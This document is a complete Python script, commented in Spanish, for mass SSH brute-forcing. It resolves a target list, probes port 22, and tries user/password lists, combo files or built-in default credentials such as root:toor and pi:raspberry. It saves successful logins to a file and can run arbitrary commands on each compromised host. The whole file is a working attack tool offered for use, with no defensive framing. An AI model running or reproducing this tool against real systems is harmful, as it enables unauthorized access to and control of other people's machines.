import argparse
import paramiko
import threading
import multiprocessing
import os
import socket
import sys
import time
import logging
from datetime import datetime

# GLOBAL DEBUG FLAG AND FILE
debug_mode = False
debug_file_path = None


def debug_print(message, level="DEBUG"):
    """
    Escribe mensajes de debug o warning en el archivo especificado.
    level: "DEBUG" o "WARNING".
    """
    if debug_mode and debug_file_path:
        try:
            with open(debug_file_path, 'a') as dbg:
                dbg.write(f"[{level}] {datetime.now().isoformat()} {message}\n")
        except Exception:
            pass

# Silence Paramiko logging to console
paramiko_logger = logging.getLogger("paramiko.transport")
paramiko_logger.addHandler(logging.NullHandler())


def load_raw_targets(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error al leer archivo de targets: {e}", flush=True)
        sys.exit(1)


def resolve_host(host):
    try:
        socket.gethostbyname(host)
        return host
    except socket.gaierror:
        return None
    except Exception as e:
        debug_print(f"Error inesperado al resolver {host}: {e}", level="WARNING")
        return None


def load_cred_list(user_list, pass_list, combo_list, single_user, single_pass, default_flag):
    creds = []
    if combo_list:
        try:
            with open(combo_list) as f:
                for line in f:
                    if ':' in line:
                        u, p = line.strip().split(':', 1)
                        creds.append((u, p))
                        debug_print(f"Combo cargado: {u}:{p}")
        except Exception as e:
            debug_print(f"Error al leer archivo combo: {e}", level="WARNING")
            print(f"[!] Error al leer archivo combo: {e}", flush=True)
            sys.exit(1)
    else:
        users, passwords = [], []
        if user_list:
            try:
                with open(user_list) as f:
                    users = [l.strip() for l in f if l.strip()]
                debug_print(f"Usuarios cargados: {users}")
            except Exception as e:
                debug_print(f"Error al leer lista de usuarios: {e}", level="WARNING")
                print(f"[!] Error al leer lista de usuarios: {e}", flush=True)
                sys.exit(1)
        if single_user:
            users.append(single_user)
            debug_print(f"Usuario individual: {single_user}")
        if pass_list:
            try:
                with open(pass_list) as f:
                    passwords = [l.strip() for l in f if l.strip()]
                debug_print(f"Passwords cargados: {passwords}")
            except Exception as e:
                debug_print(f"Error al leer lista de contraseñas: {e}", level="WARNING")
                print(f"[!] Error al leer lista de contraseñas: {e}", flush=True)
                sys.exit(1)
        if single_pass:
            passwords.append(single_pass)
            debug_print(f"Contraseña individual: {single_pass}")
        for u in users:
            for p in passwords:
                creds.append((u, p))
                debug_print(f"Credencial combinada: {u}:{p}")
    if default_flag:
        defaults = [
            ('root','root'), ('root','toor'), ('admin','admin'), ('admin','password'),
            ('user','user'), ('pi','raspberry'), ('ubuntu','ubuntu'), ('cisco','cisco'),
            ('ubnt','ubnt'), ('guest','guest'), ('admin','1234'), ('root','admin')
        ]
        creds.extend(defaults)
        debug_print("Credenciales por defecto añadidas")
    unique = []
    seen = set()
    for c in creds:
        if c not in seen:
            seen.add(c)
            unique.append(c)
    if not unique:
        debug_print("No hay credenciales cargadas", level="WARNING")
        print("[!] No hay credenciales cargadas.", flush=True)
        sys.exit(1)
    return unique


def attempt_ssh(host, username, password, commands, output_file, counters, lock, successes):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password, timeout=5, banner_timeout=5)
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"[+] Logueo exitoso - {host}:{username}:{password} - Hora de logueo {now}"
        with lock:
            with open(output_file, 'a') as out:
                out.write(f"{host}:{username}:{password}\n")
            counters['success'] += 1
            successes.append(msg)
        print(msg, flush=True)
        if commands:
            for cmd in commands:
                stdin, stdout, stderr = client.exec_command(cmd)
                result = stdout.read().decode().strip() or stderr.read().decode().strip()
                line = f"[*] Comando ejecutado: {cmd} - {result}"
                with lock:
                    successes.append(line)
                print(line, flush=True)
        client.close()
        return True
    except Exception as e:
        debug_print(f"SSHException en {host} con {username}:{password} -> {e}", level="WARNING")
        return False


def worker(args):
    host, cred_list, commands, output_file, counters, lock, successes = args
    # Chequeo TCP al puerto 22
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 22))
        sock.close()
    except Exception as e:
        debug_print(f"Host {host} omitido por conectividad SSH fallida: {e}", level="WARNING")
        with lock:
            counters['scanned'] += 1
        return
    # Intento de credenciales
    try:
        for user, pwd in cred_list:
            if attempt_ssh(host, user, pwd, commands, output_file, counters, lock, successes):
                break
    except Exception as e:
        debug_print(f"Error inesperado en worker para host {host}: {e}", level="WARNING")
    finally:
        with lock:
            counters['scanned'] += 1


def print_stats(start_time, total_ips, counters, stop_event, successes):
    while not stop_event.is_set():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"Hora de inicio: {start_time}", flush=True)
        print(f"Cantidad de IP: {total_ips} | Revisadas: {counters['scanned']} | Exitos: {counters['success']}", flush=True)
        print('-' * 60, flush=True)
        for msg in list(successes):
            print(msg)
        time.sleep(3)


def main():
    parser = argparse.ArgumentParser(description="SSH brute-force y ejecucion de comandos sobre hosts (IP o DNS)")
    parser.add_argument('-i', '--target-list', '--ip-list', required=True, help="Archivo con lista de IPs o DNS")
    parser.add_argument('-u', '--user', help="Usuario individual")
    parser.add_argument('-P', '--password', help="Password individual")
    parser.add_argument('-U', '--user-list', help="Archivo lista de usuarios")
    parser.add_argument('-L', '--password-list', help="Archivo lista de passwords")
    parser.add_argument('-c', '--combo-list', help="Archivo usuario:password")
    parser.add_argument('-d', '--default', action='store_true', help="Credenciales por defecto")
    parser.add_argument('-x', '--commands', nargs='+', help="Comandos tras login exitoso")
    parser.add_argument('-p', '--processes', type=int, default=1, help="Procesos en paralelo")
    parser.add_argument('-o', '--output-file', default='successful_logins.txt', help="Salida logins exitosos")
    parser.add_argument('--debug-file', default='debug.log', help="Archivo debug")
    parser.add_argument('--debug', action='store_true', help="Habilitar debug")
    args = parser.parse_args()

    global debug_mode, debug_file_path
    debug_mode = args.debug
    debug_file_path = args.debug_file if debug_mode else None
    if debug_mode and debug_file_path:
        paramiko_logger.handlers.clear()
        paramiko_logger.setLevel(logging.WARNING)
        fh = logging.FileHandler(debug_file_path)
        fh.setLevel(logging.WARNING)
        fh.setFormatter(logging.Formatter('[%(levelname)s] %(asctime)s %(message)s'))
        paramiko_logger.addHandler(fh)
        debug_print("Modo debug activado", level="DEBUG")

    raw_hosts = load_raw_targets(args.target_list)
    if not raw_hosts:
        print("[!] No hay hosts.", flush=True)
        sys.exit(1)

    pool_resolve = multiprocessing.Pool(processes=args.processes)
    resolved = pool_resolve.map(resolve_host, raw_hosts)
    pool_resolve.close()
    pool_resolve.join()
    targets = [h for h in resolved if h]
    if not targets:
        print("[!] Ningún host resolvió.", flush=True)
        sys.exit(1)
    print(f"[+] {len(targets)} hosts resueltos.", flush=True)

    cred_list = load_cred_list(args.user_list, args.password_list, args.combo_list, args.user, args.password, args.default)
    print(f"[+] {len(cred_list)} combinaciones de credenciales.", flush=True)

    manager = multiprocessing.Manager()
    counters = manager.dict({'scanned': 0, 'success': 0})
    successes = manager.list()
    lock = manager.Lock()
    start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    open(args.output_file, 'w').close()
    if debug_mode:
        open(debug_file_path, 'w').close()

    stop_event = threading.Event()
    stats_thread = threading.Thread(target=print_stats, args=(start_time, len(targets), counters, stop_event, successes), daemon=True)
    stats_thread.start()

    worker_args = [(host, cred_list, args.commands or [], args.output_file, counters, lock, successes) for host in targets]
    pool = multiprocessing.Pool(processes=args.processes)
    pool.map(worker, worker_args)
    pool.close()
    pool.join()

    stop_event.set()
    stats_thread.join()

    print("Escaneo finalizado.", flush=True)

if __name__ == '__main__':
    main()
